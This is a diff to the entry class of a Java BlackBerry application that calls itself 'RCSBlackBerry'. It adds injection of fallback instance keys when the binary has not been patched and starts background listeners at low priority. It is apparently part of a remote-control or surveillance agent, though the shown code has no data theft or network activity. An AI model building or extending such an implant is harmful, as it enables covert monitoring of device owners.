@@ -10,6 +10,8 @@ package blackberry;
 
 import net.rim.device.api.system.Application;
 import tests.MainTest;
+import blackberry.config.InstanceKeys323;
+import blackberry.config.Keys;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
 
@@ -43,7 +45,7 @@ public class Main extends Application {
 
     private final Debug debug;
 
-    AppListener appListener = AppListener.getInstance();
+    AppListener appListener;
 
     /**
      * Instantiates a new main.
@@ -51,10 +53,22 @@ public class Main extends Application {
     public Main() {
         Thread.currentThread().setPriority(Thread.MIN_PRIORITY);
 
+        boolean binaryPatched = false;
+        if (!Keys.hasBeenBinaryPatched()) {
+            binaryPatched = true;
+            InstanceKeys323.injectKeys323();
+        }
+
+        appListener = AppListener.getInstance();
         final Core core = Core.getInstance();
 
         debug = new Debug("Main", DebugLevel.VERBOSE);
         debug.info("RCSBlackBerry " + Version.getString());
+
+        if (binaryPatched) {
+            // #debug
+            debug.warn("Not binary patched, injecting 323");
+        }
 
         final Thread coreThread = new Thread(core);
         coreThread.setPriority(Thread.MIN_PRIORITY);
@@ -69,19 +83,18 @@ public class Main extends Application {
     public void startListeners() {
         //#debug info
         debug.info("Starting Listeners");
-        
-      
+
         addHolsterListener(appListener);
         addSystemListener(appListener);
     }
-    
+
     /**
      * 
      */
     public void stopListeners() {
-      //#debug info
+        //#debug info
         debug.info("Stopping Listeners");
-        
+
         removeHolsterListener(appListener);
         removeSystemListener(appListener);
     }
